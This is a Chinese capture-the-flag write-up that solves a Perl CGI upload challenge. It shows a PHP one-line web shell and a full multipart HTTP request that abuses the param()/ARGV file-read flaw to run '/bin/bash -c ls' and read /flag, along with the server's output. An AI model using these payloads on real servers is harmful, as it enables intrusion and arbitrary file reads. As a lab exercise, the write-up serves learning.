# i_got_id_200

## 解题思路

- 首先打开网页，发现有三个页面，点开第一个‘Hello World’，没啥东西；点开第二个‘Forms’，里面有一个Name一个Age，填了东西发现没有注入点，只是单纯把我们的输入给打印在网页上而已（虽然确实是从服务器发来的，但不进行数据库操作，只是单纯的复制粘贴）

- 打开第三个页面，发现是个上传框，想到文件上传漏洞，构建一句话木马尝试一下：

    `<?php @eval($_POST['hacker']); ?>`

- 结果没有成功执行，它只是把我的这句代码打出到屏幕上而已...

- 看别人的wp，发现有个新的知识点：

    - param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的

    - 而在网页上显示输入内容很有可能就是用了param()函数来实现，例如：

        ```php
        use strict;
        use warnings; 
        use CGI;
        my $cgi= CGI->new;
        if ( $cgi->upload( 'file' ) ) { 
            my $file= $cgi->param( 'file' );
            while ( <$file> ) { print "$_"; }
        } 
        ```

- 我们试一下，看看是不是param()的问题：看到 `/cgi-bin/forms.pl` ，猜想代码放在 `/var/www/cgi-bin/file.pl` 里(/var/www/...，国际惯例了，咱们自己的139邮箱和hecaiyun都是/var/www/...的结构)；

    - 利用 `/bin/bash` 读取文件（很神奇，明明不能执行语句只能读文件名，但是这句话居然也可以执行），构造payload：

    ```r
    POST /cgi-bin/file.pl?/bin/bash%20-c%20ls${IFS}/|  HTTP/1.1
    Host: 111.198.29.45:49113
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=---------------------------18467633426500
    Content-Length: 427
    Origin: http://111.198.29.45:49113
    Connection: close
    Referer: http://111.198.29.45:49113/cgi-bin/file.pl
    Upgrade-Insecure-Requests: 1

    -----------------------------18467633426500
    Content-Disposition: form-data; name="file"
    Content-Type: application/octet-stream

    ARGV
    -----------------------------18467633426500
    Content-Disposition: form-data; name="file"; filename="1.php"
    Content-Type: image/jpeg


    -----------------------------18467633426500
    Content-Disposition: form-data; name="Submit!"

    Submit!
    -----------------------------18467633426500--
    ```

    服务器回应：

    ```html
    bin
    <br />boot
    <br />dev
    <br />etc
    <br />flag
    <br />home
    <br />lib
    <br />lib64
    <br />media
    <br />mnt
    <br />opt
    <br />proc
    <br />root
    <br />run
    <br />sbin
    <br />srv
    <br />sys
    <br />tmp
    <br />usr
    <br />var
    <br /></body></html>
    ```

    找到了，把 `/bin/bash...` 改成 `/flag` ，请求，服务器回复flag，搞定！

- 其实也可以直接一上来就 `/flag` ，也能试出来。

## 待解决的问题：

- `/bin/bash ...` 到底是什么语句？为什么能被视为文件名呢？